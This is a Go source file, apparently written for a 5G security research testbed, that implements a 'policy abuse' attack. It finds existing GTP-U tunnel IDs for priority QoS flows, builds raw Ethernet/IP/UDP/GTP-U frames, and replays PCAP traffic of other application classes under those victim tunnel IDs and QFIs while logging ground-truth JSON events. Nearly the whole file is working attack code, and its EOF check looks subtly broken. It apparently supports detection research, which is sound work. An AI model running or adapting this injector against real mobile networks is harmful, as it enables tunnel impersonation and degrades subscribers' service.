package main

import (
	"context"
	"encoding/binary"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/google/gopacket/pcapgo"
	"golang.org/x/sys/unix"
)

/************** Config & discovery **************/

type QosProfile struct {
	Application string `json:"application"`
	Description string `json:"description"`
	Pcap        string `json:"pcap"`
	Qfi         int    `json:"qfi"`
	IdleRange   []int  `json:"idle_range"`
}
type Config struct {
	QosProfiles []QosProfile `json:"qos_profiles"`
}

const (
	tmpDirDefault     = "/tmp"
	qfiFilePatternStr = `^qfi_ue(\d+)_qfi(\d+)\.txt$`

	GTPUPort   = 2152
	GTPUHdrLen = 16
	MaxFrame   = 1500
)

var (
	qfiFileRe = regexp.MustCompile(qfiFilePatternStr)

	// L2/L3 endpoints; override on HPC3 via env if needed
	SrcMACStr = envOr("SRC_MAC", "a0:36:9f:ba:36:ac")
	DstMACStr = envOr("DST_MAC", "e4:1d:2d:09:a8:30")
	SrcIPStr  = envOr("SRC_IP", "192.168.44.13")
	DstIPStr  = envOr("DST_IP", "192.168.44.18")
)

func envOr(k, def string) string { if v := os.Getenv(k); v != "" { return v }; return def }
func nowNs() int64               { return time.Now().UnixNano() }

func readConfig(path string) (*Config, string, error) {
	b, err := os.ReadFile(path)
	if err != nil { return nil, "", err }
	var cfg Config
	if err := json.Unmarshal(b, &cfg); err != nil { return nil, "", err }
	return &cfg, filepath.Dir(path), nil
}

func resolvePCAP(cfgDir, raw string) (string, error) {
	if raw == "" { return "", fmt.Errorf("pcap empty") }
	if filepath.IsAbs(raw) {
		if _, err := os.Stat(raw); err != nil { return "", fmt.Errorf("pcap does not exist: %s", raw) }
		return raw, nil
	}
	abs := filepath.Clean(filepath.Join(cfgDir, raw))
	if _, err := os.Stat(abs); err != nil { return "", fmt.Errorf("resolved pcap does not exist: %s", abs) }
	return abs, nil
}

// Return existing TEIDs keyed by QFI (from /tmp markers).
func discoverExistingByQFI(tmpDir string) (map[int][]int, error) {
	ents, err := os.ReadDir(tmpDir)
	if err != nil { return nil, err }
	byQFI := make(map[int][]int)
	seen := make(map[[2]int]struct{}) // (teid,qfi) de-dupe
	for _, e := range ents {
		if e.IsDir() { continue }
		if qfiFileRe.FindStringSubmatch(e.Name()) == nil { continue }
		var ueIdx, qfi int
		if _, err := fmt.Sscanf(e.Name(), "qfi_ue%d_qfi%d.txt", &ueIdx, &qfi); err != nil { continue }
		teid := ueIdx + 1
		key := [2]int{teid, qfi}
		if _, ok := seen[key]; ok { continue }
		seen[key] = struct{}{}
		byQFI[qfi] = append(byQFI[qfi], teid)
	}
	return byQFI, nil
}

/************** Raw GTP-U sender **************/

type RawSender struct {
	fd     int
	sa     unix.SockaddrLinklayer
	srcMac [6]byte
	dstMac [6]byte
	srcIP  uint32
	dstIP  uint32
}

func htons(x uint16) uint16 { return (x<<8 | x>>8) }

func parseMAC(s string) ([6]byte, error) {
	hw, err := net.ParseMAC(s); if err != nil { return [6]byte{}, err }
	var b [6]byte; copy(b[:], hw[:6]); return b, nil
}
func ip4(a string) (uint32, error) {
	ip := net.ParseIP(a).To4(); if ip == nil { return 0, fmt.Errorf("bad ip %q", a) }
	return binary.BigEndian.Uint32(ip), nil
}
func checksum(b []byte) uint16 {
	var sum uint32
	for i := 0; i+1 < len(b); i += 2 { sum += uint32(binary.BigEndian.Uint16(b[i:])) }
	if len(b)%2 == 1 { sum += uint32(b[len(b)-1]) << 8 }
	sum = (sum >> 16) + (sum & 0xFFFF); sum += (sum >> 16)
	return ^uint16(sum)
}

func NewRawSender(iface string) (*RawSender, error) {
	itf, err := net.InterfaceByName(iface); if err != nil { return nil, err }
	fd, err := unix.Socket(unix.AF_PACKET, unix.SOCK_RAW, int(htons(unix.ETH_P_ALL)))
	if err != nil { return nil, err }
	sa := unix.SockaddrLinklayer{Ifindex: itf.Index, Halen: 6}
	if err := unix.Bind(fd, &sa); err != nil { unix.Close(fd); return nil, err }
	srcMac, err := parseMAC(SrcMACStr); if err != nil { unix.Close(fd); return nil, err }
	dstMac, err := parseMAC(DstMACStr); if err != nil { unix.Close(fd); return nil, err }
	sip, err := ip4(SrcIPStr); if err != nil { unix.Close(fd); return nil, err }
	dip, err := ip4(DstIPStr); if err != nil { unix.Close(fd); return nil, err }
	return &RawSender{fd: fd, sa: sa, srcMac: srcMac, dstMac: dstMac, srcIP: sip, dstIP: dip}, nil
}
func (s *RawSender) Close() { _ = unix.Close(s.fd) }

func (s *RawSender) SendGTPU(teid uint32, qfi uint8, inner []byte) error {
	maxInner := MaxFrame - (14 + 20 + 8 + GTPUHdrLen)
	if len(inner) > maxInner { inner = inner[:maxInner] }

	buf := make([]byte, 14+20+8+GTPUHdrLen+len(inner))
	// Ethernet
	copy(buf[0:6], s.dstMac[:])
	copy(buf[6:12], s.srcMac[:])
	binary.BigEndian.PutUint16(buf[12:14], 0x0800)

	// IPv4
	off := 14
	ipLen := uint16(20 + 8 + GTPUHdrLen + len(inner))
	buf[off+0] = (4 << 4) | 5
	binary.BigEndian.PutUint16(buf[off+2:off+4], ipLen)
	binary.BigEndian.PutUint16(buf[off+6:off+8], 0)
	buf[off+8] = 64
	buf[off+9] = 17 // UDP
	binary.BigEndian.PutUint32(buf[off+12:off+16], s.srcIP)
	binary.BigEndian.PutUint32(buf[off+16:off+20], s.dstIP)
	cs := checksum(buf[off : off+20])
	binary.BigEndian.PutUint16(buf[off+10:off+12], cs)

	// UDP
	off = 14 + 20
	binary.BigEndian.PutUint16(buf[off+0:off+2], 12345)           // src port
	binary.BigEndian.PutUint16(buf[off+2:off+4], uint16(GTPUPort)) // dst port
	udpLen := uint16(8 + GTPUHdrLen + len(inner))
	binary.BigEndian.PutUint16(buf[off+4:off+6], udpLen)

	// GTP-U + PDU Session Container (QFI)
	off = 14 + 20 + 8
	buf[off+0] = 0x34 // v1, PT=1, E=1, S=1
	buf[off+1] = 0xFF // T-PDU
	binary.BigEndian.PutUint16(buf[off+2:off+4], uint16(len(inner)+8))
	binary.BigEndian.PutUint32(buf[off+4:off+8], teid)
	buf[off+8] = 0
	buf[off+9] = 0
	buf[off+10] = 0
	buf[off+11] = 0x85 // PDU Session Container IE
	buf[off+12] = 0x01 // length
	buf[off+13] = 0x10 // flags (QFI present)
	buf[off+14] = qfi & 0x3F
	buf[off+15] = 0x00

	copy(buf[off+GTPUHdrLen:], inner)
	return unix.Sendto(s.fd, buf, 0, &s.sa)
}

/************** PCAP replay (timed) **************/

// sendPCAPPaced: preserve timing at ~1x (or scaled by speed=1.0) until ctx done.
func sendPCAPPaced(ctx context.Context, rs *RawSender, r *pcapgo.Reader, teid uint32, qfi uint8) error {
	var firstTS, origin time.Time
	firstSeen := false

	for {
		data, ci, err := r.ReadPacketData()
		if err != nil {
			if errors.Is(err, os.ErrClosed) { return nil }
			if errors.Is(err, ioEOF()) { return nil }
			return err
		}
		if !firstSeen {
			firstSeen = true
			firstTS = ci.Timestamp
			origin = time.Now()
		}
		// wallclock schedule (speed=1.0)
		delta := ci.Timestamp.Sub(firstTS)
		target := origin.Add(delta)
		now := time.Now()
		if target.After(now) {
			select {
			case <-time.After(target.Sub(now)):
			case <-ctx.Done():
				return ctx.Err()
			}
		}
		if len(data) > 0 {
			if err := rs.SendGTPU(teid, qfi, data); err != nil { return err }
		}
	}
}

// tiny shim to avoid importing io just for EOF
func ioEOF() error { var e *os.PathError; _ = e; return errors.New("EOF") }

/************** Main **************/

func main() {
	rand.Seed(time.Now().UnixNano())

	// Flags
	victimQFIsCSV := flag.String("victim-qfis", "3,5", "Comma-separated list of priority QFIs to impersonate (e.g., 3,5)")
	count := flag.Int("count", 1, "Number of existing TEIDs to impersonate")
	duration := flag.Int("duration", 15, "Duration (s)")
	iface := flag.String("iface", "enp2s0f0", "N3/N9 interface")
	configPath := flag.String("config", "config.json", "Path to config.json")
	mapStr := flag.String("map", "", "VictimQFI:FakeQFI mapping, e.g., 3:6,5:4 (overrides defaults)")
	jitterMs := flag.String("jitter-ms", "100:800", "Per-TEID start jitter range (ms), format min:max")
	flag.Parse()

	// Default mapping (paper story)
	qfiMap := map[int]int{
		3: 6, // VoIP -> Downloads
		5: 4, // VideoConf -> Buffered
	}
	// Parse user overrides
	if strings.TrimSpace(*mapStr) != "" {
		parts := strings.Split(*mapStr, ",")
		for _, p := range parts {
			p = strings.TrimSpace(p); if p == "" { continue }
			kv := strings.Split(p, ":")
			if len(kv) != 2 { fmt.Printf("[policy-abuse][ERROR] bad --map entry: %q\n", p); os.Exit(2) }
			k, err1 := strconv.Atoi(strings.TrimSpace(kv[0]))
			v, err2 := strconv.Atoi(strings.TrimSpace(kv[1]))
			if err1 != nil || err2 != nil { fmt.Printf("[policy-abuse][ERROR] bad ints in --map entry: %q\n", p); os.Exit(2) }
			qfiMap[k] = v
		}
	}

	// Parse victims list
	var victimQFIs []int
	for _, tok := range strings.Split(*victimQFIsCSV, ",") {
		tok = strings.TrimSpace(tok); if tok == "" { continue }
		q, err := strconv.Atoi(tok); if err == nil && q > 0 { victimQFIs = append(victimQFIs, q) }
	}
	if len(victimQFIs) == 0 {
		fmt.Println("[policy-abuse][ERROR] no valid --victim-qfis"); os.Exit(2)
	}

	// Load config + resolve PCAPs by QFI
	cfg, cfgDir, err := readConfig(*configPath)
	if err != nil { fmt.Printf("[policy-abuse][ERROR] read config: %v\n", err); os.Exit(1) }
	qfiToPCAP := map[int]string{}
	for _, p := range cfg.QosProfiles {
		abs, err := resolvePCAP(cfgDir, p.Pcap)
		if err != nil { fmt.Printf("[policy-abuse][WARN] skipping profile (qfi=%d): %v\n", p.Qfi, err); continue }
		qfiToPCAP[p.Qfi] = abs
	}
	// Ensure fake QFIs exist in config
	for _, fakeQ := range qfiMap {
		if _, ok := qfiToPCAP[fakeQ]; !ok {
			fmt.Printf("[policy-abuse][ERROR] fake QFI %d has no PCAP in config.json\n", fakeQ)
			os.Exit(1)
		}
	}

	// Discover existing TEIDs for victims
	byQFI, err := discoverExistingByQFI(tmpDirDefault)
	if err != nil { fmt.Printf("[policy-abuse][WARN] discover: %v\n", err) }
	var candidates [][2]int // (teid, victimQFI)
	for _, vq := range victimQFIs {
		for _, teid := range byQFI[vq] {
			candidates = append(candidates, [2]int{teid, vq})
		}
	}
	if len(candidates) == 0 {
		fmt.Println("[policy-abuse][ERROR] no existing TEIDs for requested victim QFIs (check /tmp files)")
		os.Exit(1)
	}
	if *count < 1 { *count = 1 }
	if *count > len(candidates) { *count = len(candidates) }
	rand.Shuffle(len(candidates), func(i, j int) { candidates[i], candidates[j] = candidates[j], candidates[i] })
	victims := candidates[:*count]

	// Parse jitter range
	parseRange := func(s string) (int, int) {
		parts := strings.Split(strings.TrimSpace(s), ":")
		if len(parts) != 2 { return 100, 800 }
		a, _ := strconv.Atoi(strings.TrimSpace(parts[0]))
		b, _ := strconv.Atoi(strings.TrimSpace(parts[1]))
		if a <= 0 { a = 100 }
		if b <= a { b = a + 1 }
		return a, b
	}
	jMin, jMax := parseRange(*jitterMs)

	// Raw sender
	rs, err := NewRawSender(*iface)
	if err != nil { fmt.Printf("[policy-abuse][ERROR] raw socket: %v\n", err); os.Exit(1) }
	defer rs.Close()

	// Context & signals
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(*duration)*time.Second)
	defer cancel()
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
	go func() { <-sigCh; fmt.Println("[policy-abuse] Caught signal, stopping..."); cancel() }()

	// Emit start GT
	type VictimGT struct {
		TEID      string `json:"teid"`
		UEIdx     int    `json:"ue_idx"`
		VictimQFI int    `json:"victim_qfi"`
		FakeQFI   int    `json:"fake_qfi"`
		PcapFake  string `json:"pcap_fake"`
	}
	startEvt := map[string]any{
		"event":    "teid_impersonation",
		"scenario": "policy_abuse",
		"ts_ns":    nowNs(),
		"iface":    *iface,
		"victims":  []VictimGT{},
	}
	addVictim := func(teid, vq, fq int, pcap string) {
		gt := VictimGT{
			TEID:      fmt.Sprintf("0x%x", teid),
			UEIdx:     teid - 1,
			VictimQFI: vq,
			FakeQFI:   fq,
			PcapFake:  pcap,
		}
		startEvt["victims"] = append(startEvt["victims"].([]VictimGT), gt)
	}

	// Launch per-victim replay goroutines (same TEID & victim QFI, fake PCAP)
	var wg sync.WaitGroup
	for _, pair := range victims {
		teid, vq := pair[0], pair[1]
		fq, ok := qfiMap[vq]
		if !ok {
			// pick any different QFI from config
			for q := range qfiToPCAP { if q != vq { fq = q; break } }
			if fq == 0 { fmt.Println("[policy-abuse][ERROR] no alternative QFI in config"); os.Exit(1) }
		}
		pcap := qfiToPCAP[fq]
		addVictim(teid, vq, fq, pcap)

		// jittered start
		delay := time.Duration(jMin+rand.Intn(jMax-jMin)) * time.Millisecond

		wg.Add(1)
		go func(teid, victimQFI int, pcapPath string, startDelay time.Duration) {
			defer wg.Done()

			select {
			case <-time.After(startDelay):
			case <-ctx.Done():
				return
			}

			f, err := os.Open(pcapPath); if err != nil { fmt.Printf("[policy-abuse][WARN] open pcap: %v\n", err); return }
			defer f.Close()
			rd, err := pcapgo.NewReader(f); if err != nil { fmt.Printf("[policy-abuse][WARN] pcap reader: %v\n", err); return }

			// Replay at ~1x until context timeout
			_ = sendPCAPPaced(ctx, rs, rd, uint32(teid), uint8(victimQFI))
		}(teid, vq, pcap, delay)
	}

	// Print start JSON
	if b, _ := json.Marshal(startEvt); len(b) > 0 { fmt.Println(string(b)) }

	wg.Wait()

	// Emit stop event
	stopEvt := map[string]any{ "event": "teid_impersonation_end", "ts_ns": nowNs() }
	if b, _ := json.Marshal(stopEvt); len(b) > 0 { fmt.Println(string(b)) }
}
